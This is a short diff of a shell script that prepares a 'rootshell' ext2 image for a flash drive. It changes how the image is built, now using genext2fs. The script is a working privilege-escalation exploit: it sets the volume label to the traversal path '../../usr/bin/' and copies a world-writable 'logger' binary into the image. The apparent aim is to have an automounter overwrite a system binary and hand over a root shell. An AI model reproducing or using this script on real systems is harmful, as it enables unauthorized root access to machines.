@@ -1,9 +1,7 @@
-#requires e2tools
+#requires e2tools, and genext2fs
 
 #make 8mb image
-dd if=/dev/zero of=./rootshell.ext2 bs=1024 count=8192
-#make ext2 from it , all zero UUID means no UUID, label is dir traversal
-mke2fs rootshell.ext2 -U 00000000-0000-0000-0000-000000000000 -L "../../usr/bin/"
+genext2fs -L "../../usr/bin/" -B 1024 -b 8192 rootshell.ext2
 e2cp -P 777 logger rootshell.ext2:/
 echo "======================================"
 echo "Rootshell file system prepared. Insert flash drive and do:"
